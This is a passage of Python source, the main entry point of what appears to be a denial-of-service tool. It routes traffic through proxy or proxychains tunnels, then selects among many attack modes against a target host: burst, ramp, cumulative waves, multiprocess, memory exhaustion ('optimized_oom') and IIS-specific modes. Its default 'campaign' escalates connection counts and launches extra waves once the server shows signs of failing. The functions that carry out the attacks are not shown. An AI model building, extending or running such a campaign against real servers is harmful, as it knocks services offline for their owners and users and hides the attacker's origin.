    tunnel_cfg = merge_tunnel_overrides(
        tunnel_cfg,
        mode=args.tunnel_mode,
        proxy_url=args.proxy_url,
        proxychains_conf=args.proxychains_conf,
    )
    activated = activate_tunnel(tunnel_cfg)
    if activated.mode != "none":
        print(f"Tunnel active: {activated.summary()}", flush=True)

    variant = args.variant
    spec = get_variant(variant)
    port = args.port if args.port != DEFAULT_PORT else spec.default_port

    bind_default: list[str | None] = [None]

    if args.mode == "ramp":
        run_ramp(args.host, [5, 10, 15, 20, 25, 30, 35, 40, 45, 50, 60, 70, 80, 100], hold=120, drip=25, bind_ips=bind_default)
    elif args.mode == "burst":
        run_attack("burst_seq", args.host, port, args.connections, hold=180, bomb_mode="sequential", bind_ips=bind_default)
    elif args.mode == "cumulative":
        run_cumulative_waves(args.host, args.connections, wave_size=5, stagger=3, hold=300)
    elif args.mode == "multiprocess":
        run_multiprocess(args.host, args.connections, hold=240, stagger=0.5)
    elif args.mode == "sustained":
        run_sustained(args.host, connections=args.connections, cycles=8, hold=10, drip=5)
    elif args.mode == "optimized_oom":
        run_optimized_single_client_oom(args.host, cycles=25)
    elif args.mode == "churn":
        run_churn(args.host, cycles=40, connections=args.connections)
    elif args.mode == "apex":
        run_apex(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_scaled":
        run_apex_scaled(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_mp":
        run_apex_multiprocess(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie":
        run_apex_cookie(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie_scaled":
        run_apex_cookie_scaled(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_cookie_mp":
        run_apex_cookie_multiprocess(args.host, connections=args.connections, port=port, variant=variant)
    elif args.mode == "apex_iis_mp":
        run_iis_apex_mp(args.host, port, preset_name=args.iis_preset)
    elif args.mode == "pipelined_sustain":
        run_pipelined_sustain(args.host, holders=15, churn_cycles=12)
    else:
        # Full campaign — multiple strategies logged
        print("=== CAMPAIGN START ===", flush=True)
        strategies = [
            ("burst_seq_20", 20, "sequential", 120),
            ("burst_seq_35", 35, "sequential", 180),
            ("burst_seq_50", 50, "sequential", 180),
            ("burst_par_25", 25, "parallel", 120),
            ("multiprocess_50", 0, "multiprocess", 300),
            ("burst_seq_60", 60, "sequential", 240),
            ("multiprocess_75", 0, "multiprocess", 300),
            ("burst_seq_80", 80, "sequential", 240),
            ("multiprocess_100", 0, "multiprocess", 360),
        ]
        for name, n, mode, hold in strategies:
            print(f"\n=== STRATEGY {name} ===", flush=True)
            if mode == "multiprocess":
                count = int(name.split("_")[1])
                r = run_multiprocess(args.host, count, hold=hold, stagger=0.4)
            else:
                r = run_attack(name, args.host, DEFAULT_PORT, n, hold=hold, drip=25, bomb_mode=mode, bind_ips=bind_default)
            if r and (r.server_down or (r.probe_after.http_code or 0) >= 500):
                print("Server degraded — extra cumulative waves", flush=True)
                run_cumulative_waves(args.host, 50, stagger=1, hold=300)
            time.sleep(25)

        print("\n=== CUMULATIVE 60 WAVES ===", flush=True)
        run_cumulative_waves(args.host, 60, wave_size=5, stagger=1, hold=300)

        print("\n=== RAMP 50-120 ===", flush=True)
        run_ramp(args.host, [50, 70, 90, 110, 120], hold=180, drip=20, bind_ips=bind_default)

        print("\n=== CAMPAIGN DONE ===", flush=True)
        print(f"Logs: {CSV_PATH} | {JSONL_PATH}", flush=True)


if __name__ == "__main__":
    main()
